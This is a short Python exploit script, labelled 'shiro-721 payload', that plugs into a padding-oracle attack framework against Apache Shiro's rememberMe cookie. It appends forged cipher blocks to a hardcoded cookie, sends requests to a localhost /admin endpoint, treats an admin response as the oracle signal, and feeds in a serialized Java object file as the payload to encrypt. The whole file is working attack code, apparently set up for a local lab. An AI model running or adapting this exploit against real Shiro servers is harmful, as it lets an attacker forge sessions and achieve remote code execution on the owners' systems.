from padding_oracle_attack import payload_model
from requests import Request, Response, get
from grequests import request
from base64 import b64decode, b64encode
from Crypto.Util.Padding import pad

#shiro-721 payload
class Payload(payload_model):

    def padding_ok(self, resp:Response):
        if '["admin"]' in resp.text:
            return True
        else:
            return False

    def recover_fake_data(self, req:Request, fake_datas):
        for fake_data in fake_datas:
            if fake_data in b64decode(req._cookies.get("rememberMe")):
                return fake_data
        return None

    def make_request(self, fake_data) -> request:
        rememberMe = "XPwsSYi9dItUU4yrEOL52aCxmGPQYE1xeYAsE+0EKRGdyhBLisS1T2IkbSrmVCgGggi45GcfIW/3sUzhFRHFsoZ/nqITjBjc9y0+hh2bHf1Pl+Np6FyipFIcAxlp+iT5TiVh7RWB+1LVtbEBJKLUX9uee6HjF0AfZC5AiqfzYJL1xcdZAsF5oMPkPpNR0SdV0e7drfteqzih6YwHcTsQ174iWFG7Kbzdv9qySsaG2xL2GOs31WUHaHLoX5cV5kMZKW+gA+n9vxajEnh27Poekx0pTFMqsCwff7v9eb/+4xz25L73XgGZk5/PRG8XnT8cIiWPIkLb94E7mzvHvLF8MCz0OlSfjI6G7eehzRiM5hyrlpmyCYyeV0Edu9Xk2GlgFKJncEnESdCU7cQHPp/BiL370itU6nRqk8QX5SVQ4gvQ9lwqhqDEsnnxG4ehtNRx1ngB4MbUZd1jYiAmPLk0miOuzH/Fm7uiulfVsRamctj1tlpVkpIhQdc5O7dnLSC7TF40u0JWxrFHq14z691pcA=="
        rememberMe = b64encode((b64decode(rememberMe) + fake_data)).decode()
        cookies = {
        "rememberMe": rememberMe
        }

        return request("get", "http://127.0.0.1:8080/admin", cookies=cookies)

if __name__ == "__main__":
    exp = open("/application/source/code/java/demo/src/main/resources/serialize/cs2Test.ser", "rb").read()
    payload = Payload(bytes.hex(exp), fake=True)
    payload.run()